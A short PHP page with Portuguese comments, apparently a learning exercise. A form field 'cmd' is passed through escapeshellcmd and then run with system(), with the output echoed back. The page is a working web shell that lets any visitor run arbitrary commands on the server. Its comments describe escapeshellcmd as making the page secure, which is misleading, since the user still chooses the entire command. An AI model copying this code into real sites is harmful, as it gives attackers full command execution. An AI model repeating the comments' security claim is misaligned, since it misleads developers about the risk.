<?php 

if($_SERVER["REQUEST_METHOD"] === 'POST'){
	$cmd = escapeshellcmd($_POST["cmd"]);

	echo "<pre>";
	//vamos adiconar uma segurança a esse metodo post
	//usando o escapeshellcmd: escapa qualquer caractere em uma string que possa ser utilizado para enganar um comando shell para executar comandos arbritários. Esta função deve ser utilizada para ter certeza que quaisquer dados vindos do usuário é escapado antes que estes dados sejam passados para as funções exec() ou system(), ou para backtick operator.

	// ou scapeshelarg: adiciona aspas simples em torno de uma string e escapa qualquer as aspas simples existentes permitindo a você passar uma string diretamente para uma função shell e tendo ela tradata como um argumento seguro. Esta função deve ser usado para escapar argumentos para funções shell vindos de dados de usuários. As funções shell incluem exec(), system() e backtick operator.

		$comando = system($cmd, $retorno);
	echo "</pre>";
}
?>

 <form method="post">
 	<input type="text" name="cmd">
 	<button type="submit">Enviar</button>

 </form>